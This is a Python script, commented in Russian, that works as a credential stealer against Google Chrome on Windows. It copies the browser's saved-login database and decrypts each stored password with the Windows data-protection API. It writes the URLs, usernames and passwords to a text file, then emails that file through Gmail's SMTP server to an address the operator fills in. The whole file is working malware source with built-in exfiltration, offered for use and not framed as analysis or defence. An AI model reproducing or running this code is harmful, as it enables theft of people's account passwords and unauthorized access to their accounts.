import os, sqlite3, win32crypt, time, shutil, sys           # Импортируем необходимые бииблиотеки
import smtplib                                              # Импортируем библиотеку по работе с SMTP
import mimetypes                                            # Импорт класса для обработки неизвестных MIME-типов, базирующихся на расширении файла
from email import encoders                                  # Импортируем энкодер
from email.mime.base import MIMEBase                        # Общий тип
from email.mime.text import MIMEText                        # Текст/HTML
from email.mime.multipart import MIMEMultipart              # Многокомпонентный объект

file = open("passdump.txt", "w")
file.write("")
file.close
def logit(content):
    file = open("passdump.txt", "a")
    file.write(content)
    file.close
shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
path = os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default"
crdb = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
c = sqlite3.connect(crdb)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)
login_data = cursor.fetchall()
outputlist = []
for url, user_name, pwd, in login_data:
    pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
    if url != "" and user_name != "" and pwd[1].decode('utf-8') != "":
        outputlist.append(url)
        outputlist.append(user_name)
        outputlist.append(pwd[1].decode('utf-8'))
        outputlist.append("")  
for item in outputlist:
    try:
        logit(item + "\n")
    except:
        doing = "---nothing------"      
c.close()
os.remove(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\tempdatabase")

def send_email(addr_to, msg_subj, msg_text, files):
    addr_from = "Адрес_почты-отправителя"                       # Отправитель
    password  = "Ваш_пароль_от_почты"                                  # Пароль

    msg = MIMEMultipart()                                   # Создаем сообщение
    msg['From']    = addr_from                              # Адресат
    msg['To']      = addr_to                                # Получатель
    msg['Subject'] = msg_subj                               # Тема сообщения

    body = msg_text                                         # Текст сообщения
    msg.attach(MIMEText(body, 'plain'))                     # Добавляем в сообщение текст

    process_attachement(msg, files)

    #======== Этот блок настраивается для каждого почтового провайдера отдельно ===============================================
    server = smtplib.SMTP('smtp.gmail.com', 587)        # Создаем объект SMTP
    server.starttls()                                   # Начинаем шифрованный обмен по TLS
    server.login(addr_from, password)                   # Получаем доступ
    server.send_message(msg)                            # Отправляем сообщение
    server.quit()                                       # Выходим
    #==========================================================================================================================
    
def process_attachement(msg, files):                        # Функция по обработке списка, добавляемых к сообщению файлов
    for f in files:
        if os.path.isfile(f):                               # Если файл существует
            attach_file(msg,f)                              # Добавляем файл к сообщению
        elif os.path.exists(f):                             # Если путь не файл и существует, значит - папка
            dir = os.listdir(f)                             # Получаем список файлов в папке
            for file in dir:                                # Перебираем все файлы и...
                attach_file(msg,f+"/"+file)                 # ...добавляем каждый файл к сообщению

def attach_file(msg, filepath):                             # Функция по добавлению конкретного файла к сообщению
    filename = os.path.basename(filepath)                   # Получаем только имя файла
    ctype, encoding = mimetypes.guess_type(filepath)        # Определяем тип файла на основе его расширения
    if ctype is None or encoding is not None:               # Если тип файла не определяется
        ctype = 'application/octet-stream'                  # Будем использовать общий тип
    maintype, subtype = ctype.split('/', 1)                 # Получаем тип и подтип
    if maintype == 'text':                                  # Если текстовый файл
        with open(filepath) as fp:                          # Открываем файл для чтения
            file = MIMEText(fp.read(), _subtype=subtype)    # Используем тип MIMEText
            fp.close()                                      # После использования файл обязательно нужно закрыть
    file.add_header('Content-Disposition', 'attachment', filename=filename) # Добавляем заголовки
    msg.attach(file)                                        # Присоединяем файл к сообщению

addr_to   = "Адрес_почты-получателя"                                # Получатель(можно указать ту же почту , что и в отправлителя)
files = ['passdump.txt']                                       # Отправляем текстовый файл из паролями passdump.txt
send_email(addr_to, "Тема сообщения", "Текст сообщения", files)